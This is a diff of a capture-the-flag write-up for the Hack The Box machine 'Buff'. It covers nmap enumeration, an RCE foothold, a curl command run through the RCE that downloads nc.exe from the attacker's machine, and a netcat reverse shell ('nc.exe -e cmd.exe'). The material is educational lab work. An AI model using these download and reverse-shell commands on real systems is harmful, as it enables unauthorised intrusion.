@@ -9,7 +9,7 @@ published: true
 1. [Introduction](#introduction)
 1. [Enumertion](#enumeration)
 1. [FootHold](#foothold)
-1. [Lateral Movement](#lateral-movement)
+1. [Lateral Movement](#getting-proper-shell)
 1. [Priv Esc](#priv-esc)
 
 ## Introduction
@@ -25,10 +25,10 @@ So first things first we are going to scan this machine for open ports and servi
 `sudo nmap -sC -sV -O -oN nmap/buff 10.10.10.198`
 
 ``` 
-// -sC : Perform nmap scan using default scripts (NOTE: You can use specific lua scripts to perform custom scans, please refer to man page)
-// -sV : Try to get the version of the services running in the system (NOTE: It does not return version of unknown services)
-// -O  : Operating System fingerprinting/Tries to guess which OS is running in the system
-// -oA : Output in all format inside nmap folder with name buff
+ -sC : Perform nmap scan using default scripts (NOTE: You can use specific lua scripts to perform custom scans, please refer to man page)
+ -sV : Try to get the version of the services running in the system (NOTE: It does not return version of unknown services)
+ -O  : Operating System fingerprinting/Tries to guess which OS is running in the system
+ -oA : Output in all format inside nmap folder with name buff
 ```
 
 We got the nmap output. Let's examin it.
@@ -62,7 +62,7 @@ You will get output like the image.
 
 Its giving us same info which nmap gave us. There are some extra things like Cookie, Cache-Control etc. etc.. They are not looking that intresting to us. So let's move ahead.
 
-## Foothold
+## **Foothold**
 
 ### Visit to port 8080
 
@@ -104,7 +104,7 @@ Andddd.... Bingo!! We got a RCE in the machine
 
 We can see that we are user `buff\shaun`. Now lets move ahead hacker..
 
-## Lateral Movement
+## **Getting Proper Shell**
 
 So now after getting a RCE we have to get a shell. There are many ways to get a shell if you have RCE in a machine. This is one of the method. So let's start with uploading a [`nc.exe`](https://eternallybored.org/misc/netcat/) in the machine.
 
@@ -114,13 +114,13 @@ So now after getting a RCE we have to get a shell. There are many ways to get a 
 
 2. Now execute the following command after we have RCE.
 
-`cmd.exe /c curl http://10.10.14.23:8000/nc.exe -o nc.exe`
+`cmd.exe /c curl http://<your tun0 IP address>:8000/nc.exe -o nc.exe`
 
 ```
-// cmd.exe : we are executing command prompt in the machine
-// /c      : this options will run the following command in the cmd.exe
-// curl    : Command line tool to transfer data
-// -o      : output filename  
+ cmd.exe : we are executing command prompt in the machine
+ /c      : this options will run the following command in the cmd.exe
+ curl    : Command line tool to transfer data
+ -o      : output filename  
 ```
 
 We will see that we get a GET request for nc.exe in our server 
@@ -132,5 +132,28 @@ So now lets check if we have nc.exe in the system or not.
 ![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Buff/checknc.png)
 
 nc.exe upload successful!
+
+First let's set up a listener in our machine using NetCat by entering the following command. I am setting the listener in port 9001.
+
+`nc -nvlp 9001`
+
+```
+ -n : using IPv4 address 
+ -p : port number
+ -l : listening mode
+ -v : verbose mode
+```
+
+~[image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Buff/listener.png)
+
+Now let's do the magic shall we. Enter the following command in the RCE shell
+
+`nc.exe -e cmd.exe <your tun0 IP address> <port number>`
+
+![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Buff/foothold.png)
+
+and press enter.....and boom we get a shell.
+
+![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Buff/footholdshell.png)
 
 ## Priv Esc
